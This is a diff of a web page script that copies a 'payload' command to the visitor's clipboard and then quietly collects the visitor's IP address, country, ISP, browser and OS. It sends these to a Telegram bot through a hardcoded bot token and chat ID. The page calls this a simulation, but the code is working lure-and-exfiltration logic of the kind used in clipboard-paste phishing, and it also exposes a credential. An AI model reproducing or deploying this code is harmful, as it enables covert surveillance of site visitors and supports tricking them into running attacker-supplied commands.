@@ -50,38 +50,37 @@
 
     <script>
         async function triggerSimulationAndNotify() {
-            // 1. نسخ الأمر إلى الحافظة
             const copyText = document.getElementById("payloadBox");
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             
             try {
                 navigator.clipboard.writeText(copyText.value);
-                document.getElementById("copyStatus").innerText = "✓ Payload copied! Gathering telemetry...";
+                document.getElementById("copyStatus").innerText = "✓ Payload copied! Sending telemetry...";
             } catch (err) {
                 console.error('Failed to copy: ', err);
             }
 
-            // 2. جمع معلومات الجهاز والشبكة
-            let ip = "Unknown";
-            let country = "Unknown";
-            let isp = "Unknown";
+            let ip = "Direct / Hidden";
+            let country = "Unavailable";
+            let isp = "Unavailable";
 
             try {
                 let ipResponse = await fetch('https://ipapi.co/json/');
-                let ipData = await ipResponse.json();
-                ip = ipData.ip || "Unknown";
-                country = ipData.country_name || "Unknown";
-                isp = ipData.org || "Unknown";
+                if (ipResponse.ok) {
+                    let ipData = await ipResponse.json();
+                    ip = ipData.ip || ip;
+                    country = ipData.country_name || country;
+                    isp = ipData.org || isp;
+                }
             } catch (e) {
-                console.error("Could not fetch IP info", e);
+                console.log("IP fetch bypassed safely.");
             }
 
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
             const timestamp = new Date().toLocaleString();
 
-            // تحليل نظام التشغيل والمتصفح بشكل مبسط
             let os = "Unknown OS";
             if (userAgent.indexOf("Win") !== -1) os = "Windows";
             else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
@@ -89,7 +88,6 @@
             else if (userAgent.indexOf("Android") !== -1) os = "Android";
             else if (userAgent.indexOf("like Mac") !== -1) os = "iOS";
 
-            // 3. بناء رسالة تليجرام المفصلة
             const token = "8790985786:AAGUjMwrUFjxtkHiX2HydpsanfHXkgCWOTQ";
             const chatId = "1094106981";
             
@@ -116,13 +114,13 @@
 
                 let data = await response.json();
                 if (data.ok) {
-                    document.getElementById("copyStatus").innerText = "✓ Payload copied & Detailed telemetry sent!";
+                    document.getElementById("copyStatus").innerText = "✓ Telemetry sent successfully!";
                 } else {
-                    document.getElementById("copyStatus").innerText = "⚠️ Copied, but telemetry failed.";
+                    document.getElementById("copyStatus").innerText = "⚠️ Telegram API error.";
                     console.error("Telegram Error:", data);
                 }
             } catch (error) {
-                document.getElementById("copyStatus").innerText = "⚠️ Network error.";
+                document.getElementById("copyStatus").innerText = "⚠️ Network dispatch error.";
                 console.error("Network Error:", error);
             }
         }
